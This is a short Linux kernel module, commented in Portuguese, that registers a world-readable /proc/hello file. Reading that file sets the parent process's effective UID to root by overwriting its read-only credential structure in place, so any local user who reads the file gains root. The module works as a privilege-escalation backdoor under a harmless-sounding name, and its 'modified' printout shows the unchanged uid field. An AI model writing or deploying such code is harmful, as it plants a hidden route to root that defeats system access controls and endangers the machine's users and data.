#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/sched.h>
#include <linux/cred.h>


static int hello_show(struct seq_file *m, void *v) {
	int pid;
	struct cred *cred;
	pid = current->pid;
  	seq_printf(m, "Processo atual: %d\n", pid);
	
	pid = current->parent->pid;
	seq_printf(m, "Processo pai: %d\n", pid);
	
	cred = (struct cred *) get_cred(current->parent->cred);

	seq_printf(m, "Credencial não modificada: %d\n", cred->uid.val);
	cred->euid = GLOBAL_ROOT_UID;
	seq_printf(m, "Credencial modificada: %d\n", cred->uid.val);
	put_cred(cred);

  return 0;
}

static int hello_open(struct inode *inode, struct file *file) {
  return single_open(file, hello_show, NULL);
}

static const struct file_operations hello_fops = {
  .owner	= THIS_MODULE,
  .open	        = hello_open,
  .read	        = seq_read,
  .llseek	= seq_lseek,
  .release	= single_release,
};

int init_module(void) {
  if (!proc_create("hello", 0644, NULL, &hello_fops)) {
    printk("Problema com o módulo!\n");
    return -ENOMEM;
  }
  printk("Módulo carregado!\n");
  return 0;
}

void cleanup_module(void) {
  remove_proc_entry("hello", NULL);
  printk("Módulo descarregado!\n");
}

MODULE_LICENSE("GPL");
